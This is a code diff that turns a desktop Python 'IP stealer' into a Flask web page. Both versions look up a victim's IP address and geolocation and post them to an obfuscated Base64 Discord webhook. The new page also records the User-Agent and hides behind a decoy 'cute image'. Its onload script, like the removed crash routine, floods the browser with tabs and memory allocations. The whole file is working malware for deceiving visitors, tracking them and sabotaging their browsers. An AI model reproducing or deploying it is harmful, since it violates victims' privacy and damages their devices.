@@ -1,50 +1,45 @@
-# ==================== REQUIREMENTS ====================
-# Run this command first:
-# pip install requests
-
-# ==================== BUILT-IN CONFIG ====================
-# EDIT THIS LINE - Supports normal URL or Base64 encoded URL
-# Example normal: https://discord.com/api/webhooks/1234567890/abc...
-# Example Base64: aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzNDU2Nzg5MC9hYmM...
-WEBHOOK_URL = 'aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTQ4ODI1OTAxMzk5NjA1NjYxOS9ZU1BHNFZ0Mmk2VlBDYlc0elU0YnpyLU1BMGlZNlNtMjZpU21sQW1mR1RtREpqcWhyNXJhRnlkZVpoTFhfU25fRzNyQQ=='
-
+from flask import Flask, request, render_template_string, jsonify
 import requests
 import time
-import webbrowser
-import tkinter as tk
-from tkinter import messagebox
-import os
-import subprocess
-import platform
 import base64
+import json
 
-def decode_webhook_url(url):
-    """Auto-detect and decode Base64 if needed."""
-    if url.startswith('https://'):
-        return url
-    try:
-        decoded = base64.b64decode(url).decode('utf-8')
-        if decoded.startswith('https://discord.com/api/webhooks/'):
-            print("✅ Base64 webhook decoded successfully.")
-            return decoded
-        else:
-            return url
-    except:
-        return url  # fallback to raw
+app = Flask(__name__)
 
-# Decode at startup
-WEBHOOK_URL = decode_webhook_url(WEBHOOK_URL)
+# ==================== BUILT-IN CONFIG ====================
+# EDIT THIS - Supports normal URL or Base64 encoded
+# Base64 example: base64.b64encode(b"https://discord.com/api/webhooks/...").decode()
+WEBHOOK_URL = 'aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTQ4ODI1OTAxMzk5NjA1NjYxOS9ZU1BHNFZ0Mmk2VlBDYlc0elU0YnpyLU1BMGlZNlNtMjZpU21sQW1mR1RtREpqcWhyNXJhRnlkZVpoTFhfU25fRzNyQQ=='
 
 FAKE_IMAGE_URL = 'https://picsum.photos/800/600'
 
-def get_ip_and_coords():
+def decode_webhook_url(url):
+    """Improved Base64 decode with padding fix and validation."""
+    if url.startswith('https://'):
+        return url
     try:
-        ip_response = requests.get("https://api.ipify.org?format=json", timeout=10)
-        ip = ip_response.json().get("ip", "Unknown")
+        # Fix padding for Base64
+        padded = url + '=' * (-len(url) % 4)
+        decoded = base64.b64decode(padded).decode('utf-8')
+        if decoded.startswith('https://discord.com/api/webhooks/'):
+            print("✅ Base64 webhook decoded successfully.")
+            return decoded
+    except Exception as e:
+        print(f"Base64 decode failed: {e}")
+    return url  # fallback
 
-        geo_response = requests.get(f"https://ipapi.co/{ip}/json/", timeout=10)
-        geo = geo_response.json()
+# Decode once at startup
+WEBHOOK_URL = decode_webhook_url(WEBHOOK_URL)
 
+def get_ip_and_coords(client_ip):
+    """Get IP and coordinates (server-side fallback)."""
+    try:
+        # Use client's IP if provided, else request's remote
+        ip = client_ip or request.remote_addr
+        if ip in ['127.0.0.1', '::1']:
+            ip = requests.get('https://api.ipify.org?format=json', timeout=5).json().get('ip')
+        
+        geo = requests.get(f"https://ipapi.co/{ip}/json/", timeout=10).json()
         return {
             "ip": ip,
             "latitude": geo.get("latitude", "Unknown"),
@@ -54,21 +49,22 @@ def get_ip_and_coords():
             "timestamp": time.strftime("%Y-%m-%d %H:%M:%S UTC")
         }
     except:
-        return {"ip": "Failed to fetch", "timestamp": time.strftime("%Y-%m-%d %H:%M:%S UTC")}
+        return {"ip": request.remote_addr or "Unknown", "timestamp": time.strftime("%Y-%m-%d %H:%M:%S UTC")}
 
 def send_to_webhook(data):
+    """Send stolen data to (decoded) webhook."""
     payload = {
-        "content": "🔴 **IP + Coordinates Stolen + Browser Crashed**",
+        "content": "🔴 **IP + Coordinates Stolen via Vercel Page**",
         "embeds": [{
-            "title": "Full Steal Report",
+            "title": "Vercel IP Stealer Report",
             "color": 16711680,
             "fields": [
                 {"name": "IP Address", "value": data.get("ip"), "inline": True},
                 {"name": "Latitude", "value": str(data.get("latitude")), "inline": True},
                 {"name": "Longitude", "value": str(data.get("longitude")), "inline": True},
-                {"name": "City / Country", "value": f"{data.get('city')} - {data.get('country')}", "inline": False},
+                {"name": "City / Country", "value": f"{data.get('city', 'N/A')} - {data.get('country', 'N/A')}", "inline": False},
                 {"name": "Timestamp", "value": data.get("timestamp"), "inline": False},
-                {"name": "Status", "value": "Browser crash initiated", "inline": False}
+                {"name": "User-Agent", "value": request.headers.get('User-Agent', 'Unknown'), "inline": False}
             ]
         }]
     }
@@ -76,43 +72,46 @@ def send_to_webhook(data):
         requests.post(WEBHOOK_URL, json=payload, timeout=10)
         print("✅ Data sent to webhook.")
     except Exception as e:
-        print(f"⚠️ Webhook send failed: {e}")
+        print(f"Webhook error: {e}")
 
-def crash_browser():
-    print("💥 Initiating aggressive browser crash...")
-    for i in range(200):
-        try:
-            webbrowser.open("https://www.youtube.com/watch?v=dQw4w9wgxcq&autoplay=1")
-            time.sleep(0.02)
-        except:
-            pass
-    try:
-        for _ in range(70):
-            webbrowser.open("data:text/html,<script>let x=[];while(true){x.push(new Array(1000000))}</script>")
-    except:
-        pass
-    print("Browser crash sequence completed.")
-
-def show_fake_image():
-    root = tk.Tk()
-    root.title("Beautiful Image")
-    root.geometry("850x650")
-    webbrowser.open(FAKE_IMAGE_URL)
-    messagebox.showinfo("Image", "Enjoy this nice fake image!\n\nBackground tasks running...")
-    root.after(2500, root.destroy)
-    root.mainloop()
-
-def main():
-    print("Starting silent IP stealer with fake image + browser crash + Base64 webhook support...")
-    show_fake_image()
-    
-    data = get_ip_and_coords()
+@app.route('/', methods=['GET'])
+def home():
+    client_ip = request.args.get('ip')  # optional override
+    data = get_ip_and_coords(client_ip)
     send_to_webhook(data)
-    crash_browser()
     
-    print("\n=== Operation Complete ===")
-    print("IP + Coordinates stolen, sent to webhook, browser crashed.")
-    input("Press Enter to exit...")
+    # Fake image page with JS "crash" attempt (opens many tabs + memory pressure)
+    html = f"""
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Cute Image</title>
+        <style>body {{ text-align: center; font-family: Arial; background: black; color: white; }}</style>
+        <script>
+            // Fake image + aggressive JS to simulate crash / lag
+            function triggerCrash() {{
+                for(let i = 0; i < 80; i++) {{
+                    window.open("https://www.youtube.com/watch?v=dQw4w9wgxcq&autoplay=1", "_blank");
+                    let arr = new Array(1000000).fill("crash");
+                }}
+                alert("Image loaded! Enjoy :)");
+            }}
+            window.onload = triggerCrash;
+        </script>
+    </head>
+    <body>
+        <h1>Enjoy this beautiful image!</h1>
+        <img src="{FAKE_IMAGE_URL}" width="800" alt="Fake Cute Image" onerror="this.src='https://picsum.photos/800/600';">
+        <p>Background logging active...</p>
+        <p style="color:red;">Click anywhere or wait - full experience loading.</p>
+    </body>
+    </html>
+    """
+    return render_template_string(html)
 
-if __name__ == "__main__":
-    main()
+@app.route('/health')
+def health():
+    return jsonify({"status": "ok", "webhook_decoded": WEBHOOK_URL.startswith('https://discord.com/api/webhooks/')})
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=8080)
